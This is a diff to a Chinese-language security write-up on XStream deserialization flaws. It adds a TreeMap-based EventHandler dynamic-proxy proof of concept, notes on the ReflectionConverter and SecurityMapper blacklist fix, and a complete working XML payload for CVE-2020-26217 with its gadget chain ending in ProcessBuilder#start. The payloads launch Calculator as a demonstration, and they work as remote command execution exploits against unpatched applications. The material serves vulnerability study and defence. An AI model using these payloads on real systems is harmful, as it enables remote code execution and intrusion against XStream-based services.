@@ -190,12 +190,9 @@ return MethodUtil.invoke(targetMethod, target, newArgs);
 ```
 
 * #### POC2
+上面提到treeSet底层也是用treeMap来处理的，所以可以用treemap标签来替换
 ```
 <tree-map>
-    <entry>
-        <string>fookey</string>
-        <string>foovalue</string>
-    </entry>
     <entry>
         <dynamic-proxy>
             <interface>java.lang.Comparable</interface>
@@ -205,10 +202,103 @@ return MethodUtil.invoke(targetMethod, target, newArgs);
                         <string>open</string>
                         <string>/System/Applications/Calculator.app</string>
                     </command>
+                </target>
                 <action>start</action>
             </handler>
         </dynamic-proxy>
         <string>good</string>
     </entry>
 </tree-map>
+```
+TreeMap的基础用法和对应的xml结构如下，然后将对象换成动态代理即可。
+```
+Map<String, String> map = new TreeMap<>();
+map.put("axisx", "ddd");
+
+<tree-map>
+  <entry>
+    <string>axisx</string>
+    <string>ddd</string>
+  </entry>
+</tree-map>
+```
+#### 补丁修复
+EventHandler对应的转换器是ReflectionConverter，修复时在ReflectionConverter中禁止了EventHandler。后续则是在SecurityMapper#readClass把EventHandler作为黑名单。
+```
+public boolean canConvert(Class type) {
+    return ((this.type != null && this.type == type) || (this.type == null && type != null && type != eventHandlerType))
+        && canAccess(type);
+}
+```
+
+### CVE-2020-26217
+* Affected Version <= 1.4.13
+* POC
+```
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
+        <dataHandler>
+          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
+            <contentType>text/plain</contentType>
+            <is class='java.io.SequenceInputStream'>
+              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
+                <iterator class='javax.imageio.spi.FilterIterator'>
+                  <iter class='java.util.ArrayList$Itr'>
+                    <cursor>0</cursor>
+                    <lastRet>-1</lastRet>
+                    <expectedModCount>1</expectedModCount>
+                    <outer-class>
+                      <java.lang.ProcessBuilder>
+                        <command>
+                          <string>open</string>
+                          <string>/System/Applications/Calculator.app</string>
+                        </command>
+                      </java.lang.ProcessBuilder>
+                    </outer-class>
+                  </iter>
+                  <filter class='javax.imageio.ImageIO$ContainsFilter'>
+                    <method>
+                      <class>java.lang.ProcessBuilder</class>
+                      <name>start</name>
+                      <parameter-types/>
+                    </method>
+                    <name>start</name>
+                  </filter>
+                  <next/>
+                </iterator>
+                <type>KEYS</type>
+              </e>
+              <in class='java.io.ByteArrayInputStream'>
+                <buf></buf>
+                <pos>0</pos>
+                <mark>0</mark>
+                <count>0</count>
+              </in>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <string>test</string>
+  </entry>
+</map>
+```
+
+* #### 漏洞成因
+```
+jdk.nashorn.internal.objects.NativeString#hashCode
+    com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString
+        javax.activation.DataHandler#getDataSource
+            com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream
+                javax.crypto.CipherInputStream#read -> getMoreData
+                    javax.crypto.NullCipher#update -> chooseFirstProvider
+                        javax.imageio.spi.FilterIterator#next
+                            javax.imageio.ImageIO.ContainsFilter#filter
+                                ProcessBuilder#start
 ```
